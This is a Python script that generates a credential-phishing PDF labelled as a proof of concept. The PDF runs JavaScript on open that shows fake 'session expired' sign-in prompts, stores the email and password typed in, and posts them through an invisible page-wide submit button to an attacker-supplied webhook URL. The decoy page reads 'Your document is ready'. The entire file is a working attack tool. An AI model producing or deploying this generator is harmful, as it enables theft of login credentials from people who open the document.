#!/usr/bin/env python3
import sys

WEBHOOK = sys.argv[1] if len(sys.argv) > 1 else "https://YOUR-WEBHOOK.example/collect"
OUT = sys.argv[2] if len(sys.argv) > 2 else "pdf-xss-poc.pdf"

def esc(s):
    return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)").replace("\n", "\\n")

js = r'''var u = app.response({cQuestion:"Your session has expired. Please sign in again.", cTitle:"Sign in", bPassword:false});
var p = app.response({cQuestion:"Password:", cTitle:"Sign in", bPassword:true});
if(u != null) this.getField("email").value = u;
if(p != null) this.getField("password").value = p;
'''
jsb = esc(js).encode("latin-1", "replace")

content = b"""0.25 0.35 0.55 rg
100 700 m 100 714 109 722 120 722 c 131 722 140 714 140 700 c 140 686 131 678 120 678 c 109 678 100 686 100 700 c f
Q
0 0 0 rg
BT /F2 28 Tf 100 600 Td (Your document is ready) Tj ET
BT /F1 13 Tf 100 570 Td (Sign in to preview and download.) Tj ET
0.25 0.35 0.55 rg 100 470 240 42 re f
1 1 1 rg
BT /F2 14 Tf 160 486 Td (View document) Tj ET
0 0 0 rg
BT /F1 10 Tf 100 430 Td (Protected content. Please sign in to continue.) Tj ET
0.1 0.45 0.85 RG
3 w
100 470 240 42 re
S
"""

ap = b"1 1 1 rg 0 0 1 1 re f"

objs = [
    b"<< /Type /Catalog /Pages 2 0 R /AcroForm 6 0 R /OpenAction << /S /JavaScript /JS (" + jsb + b") >> >>",
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R /F2 5 0 R >> >> /Contents 7 0 R /Annots [8 0 R 9 0 R 10 0 R] >>",
    b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>",
    b"<< /Type /AcroForm /Fields [8 0 R 9 0 R 10 0 R] /NeedAppearances true /DR << /Font << /F1 4 0 R /F2 5 0 R >> >> /DA (/F1 12 Tf 0 g) >>",
    b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n" + content + b"\nendstream",
    b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (email) /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>",
    b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (password) /FF 4096 /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>",
    b"<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /FF 65536 /Rect [0 0 612 792] /F 4 /A << /S /SubmitForm /F << /Type /Filespec /FS /URL /F (" + WEBHOOK.encode() + b") >> >> /AP << /N 11 0 R >> >>",
    b"<< /Type /XObject /Subtype /Form /BBox [0 0 612 792] /Resources << >> /Length " + str(len(ap)).encode() + b" >>\nstream\n" + ap + b"\nendstream",
]

pdf = b"%PDF-1.4\n"
offsets = []
for i, o in enumerate(objs, 1):
    offsets.append(len(pdf))
    pdf += b"%d 0 obj\n" % i + o + b"\nendobj\n"

xref = len(pdf)
n = len(objs) + 1
pdf += b"xref\n0 %d\n0000000000 65535 f \n" % n
for off in offsets:
    pdf += b"%010d 00000 n \n" % off
pdf += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (n, xref)

open(OUT, "wb").write(pdf)
print("wrote", OUT, len(pdf), "bytes, webhook =", WEBHOOK)
